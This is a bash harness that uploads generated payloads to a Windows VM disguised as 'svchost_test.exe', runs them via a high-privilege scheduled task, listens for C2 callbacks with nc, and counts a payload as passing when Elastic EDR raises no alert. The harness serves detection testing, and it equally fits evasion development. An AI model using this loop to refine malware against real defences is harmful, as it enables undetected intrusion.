#!/bin/bash
# sweep_elastic.sh — Run all payloads against Elastic EDR, record results
# Usage: ./scripts/sweep_elastic.sh [results_dir]

set +e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJ_DIR="$(dirname "$SCRIPT_DIR")"
RESULTS_DIR="${PROJ_DIR}/results"
if [ -L "${PROJ_DIR}/results/latest" ] || [ -d "${PROJ_DIR}/results/latest" ]; then
    SWEEP_LOG="$(readlink -f "${PROJ_DIR}/results/latest")/elastic_sweep_results.txt"
else
    SWEEP_LOG="${PROJ_DIR}/results/elastic_sweep_results.txt"
fi

VM_PORT="${VM_PORT:-10022}"
VM_USER="${VM_USER:-vmuser}"
VM_PASS="${VM_PASS:-vmuser123}"
SSH="sshpass -p $VM_PASS ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $VM_PORT $VM_USER@localhost"

ES_URL="https://localhost:9200"
ES_AUTH="elastic:changeme"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "=== Elastic EDR Sweep ===" | tee "$SWEEP_LOG"
echo "Started: $(date)" | tee -a "$SWEEP_LOG"
echo "" | tee -a "$SWEEP_LOG"

PASS=0
FAIL=0
TOTAL=0

clean_vm() {
    $SSH "taskkill /F /IM svchost_test.exe 2>nul; del /Q C:\\Users\\${VM_USER}\\svchost_test.exe 2>nul; schtasks /Delete /TN maltest /F 2>nul" 2>/dev/null || true
}

for chunk_dir in "$RESULTS_DIR"/chunk_*/; do
    exe="${chunk_dir}payload.exe"
    if [ ! -f "$exe" ]; then
        continue
    fi

    chunk_name=$(basename "$chunk_dir")
    TOTAL=$((TOTAL + 1))

    echo "--- [$TOTAL] ${chunk_name} ---" | tee -a "$SWEEP_LOG"

    # Read recipe for context
    recipe="${chunk_dir}recipe.yaml"
    if [ -f "$recipe" ]; then
        recipe_type=$(grep -m1 "malware_type\|type:" "$recipe" 2>/dev/null | head -1 | sed 's/.*: //' || echo "unknown")
        echo "  Type: ${recipe_type}" | tee -a "$SWEEP_LOG"
    fi

    # Clean VM before each test
    clean_vm

    # Record pre-test alert count
    PRE_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
    # Upload
    sshpass -p "$VM_PASS" scp -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P "$VM_PORT" \
        "$exe" "${VM_USER}@localhost:svchost_test.exe" 2>/dev/null

    # Start C2 listener
    C2_OUT="/tmp/c2_sweep_$$.bin"
    timeout 40 nc -l -p 9001 > "$C2_OUT" 2>/dev/null &
    C2_PID=$!

    # Execute
    $SSH "schtasks /Create /TN maltest /SC ONCE /ST 00:00 /TR C:\\Users\\${VM_USER}\\svchost_test.exe /F /RL HIGHEST 2>nul && schtasks /Run /TN maltest 2>nul" 2>/dev/null || true

    # Wait for execution + Elastic processing
    sleep 40

    # Kill listener
    kill $C2_PID 2>/dev/null || true
    wait $C2_PID 2>/dev/null || true

    # Check alerts
    # Count only real alerts (not test infrastructure FPs)
    NEW_ALERTS=$(curl -sk -u "$ES_AUTH" \
        "${ES_URL}/.alerts-security*/_count" \
        -H "Content-Type: application/json" \
        -d "{
            \"query\": {
                \"bool\": {
                    \"must\": [{\"range\": {\"@timestamp\": {\"gte\": \"${PRE_TS}\"}}}],
                    \"must_not\": [
                        {\"match_phrase\": {\"kibana.alert.rule.name\": \"Local Scheduled Task Creation\"}},
                        {\"match_phrase\": {\"process.args\": \"ElasticEndpoint\"}},
                        {\"match_phrase\": {\"process.args\": \"ElasticEndpointDriver\"}}
                    ]
                }
            }
        }" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('count',0))" 2>/dev/null)
    NEW_ALERTS=${NEW_ALERTS:-0}

    # Get alert details (filter out test infrastructure FPs)
    ALERT_RULES=$(curl -sk -u "$ES_AUTH" \
        "${ES_URL}/.alerts-security*/_search" \
        -H "Content-Type: application/json" \
        -d "{
            \"size\": 50,
            \"query\": {
                \"bool\": {
                    \"must\": [{\"range\": {\"@timestamp\": {\"gte\": \"${PRE_TS}\"}}}],
                    \"must_not\": [
                        {\"match_phrase\": {\"kibana.alert.rule.name\": \"Local Scheduled Task Creation\"}},
                        {\"match_phrase\": {\"process.args\": \"ElasticEndpoint\"}},
                        {\"match_phrase\": {\"process.args\": \"ElasticEndpointDriver\"}}
                    ]
                }
            },
            \"sort\": [{\"@timestamp\": \"asc\"}]
        }" 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    seen = set()
    for h in d.get('hits',{}).get('hits',[]):
        s = h['_source']
        rule = s.get('kibana.alert.rule.name','?')
        sev = s.get('kibana.alert.severity','?')
        proc = s.get('process',{}).get('name','?')
        args = ' '.join(s.get('process',{}).get('args',[]))[:80]
        if rule not in seen:
            seen.add(rule)
            print(f'    [{sev}] {rule} ({proc}: {args})')
except: pass
" 2>/dev/null)

    # Also check endpoint alerts
    EP_ALERT_RULES=$(curl -sk -u "$ES_AUTH" \
        "${ES_URL}/logs-endpoint.alerts-default/_search" \
        -H "Content-Type: application/json" \
        -d "{
            \"size\": 50,
            \"query\": {\"range\": {\"@timestamp\": {\"gte\": \"${PRE_TS}\"}}},
            \"sort\": [{\"@timestamp\": \"asc\"}]
        }" 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    for h in d.get('hits',{}).get('hits',[]):
        s = h['_source']
        rule = s.get('rule',{}).get('description','endpoint alert')
        print(f'    [endpoint] {rule}')
except: pass
" 2>/dev/null)

    C2_SIZE=0
    if [ -f "$C2_OUT" ]; then
        C2_SIZE=$(stat -c%s "$C2_OUT" 2>/dev/null || echo 0)
    fi
    rm -f "$C2_OUT"

    if [ "$NEW_ALERTS" -eq 0 ] && [ -z "$EP_ALERT_RULES" ]; then
        echo -e "  ${GREEN}PASS — zero detection, C2: ${C2_SIZE}B${NC}" | tee -a "$SWEEP_LOG"
        echo "  Result: PASS (0 alerts, C2: ${C2_SIZE}B)" >> "$SWEEP_LOG"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}FAIL — ${NEW_ALERTS} alert(s)${NC}" | tee -a "$SWEEP_LOG"
        echo "  Result: FAIL (${NEW_ALERTS} alerts)" >> "$SWEEP_LOG"
        if [ -n "$ALERT_RULES" ]; then
            echo "$ALERT_RULES" | tee -a "$SWEEP_LOG"
        fi
        if [ -n "$EP_ALERT_RULES" ]; then
            echo "$EP_ALERT_RULES" | tee -a "$SWEEP_LOG"
        fi
        FAIL=$((FAIL + 1))
    fi
    echo "" | tee -a "$SWEEP_LOG"

    # Clean up
    clean_vm
done

echo "==========================================" | tee -a "$SWEEP_LOG"
echo "SWEEP COMPLETE: ${PASS}/${TOTAL} passed, ${FAIL}/${TOTAL} detected" | tee -a "$SWEEP_LOG"
echo "Finished: $(date)" | tee -a "$SWEEP_LOG"
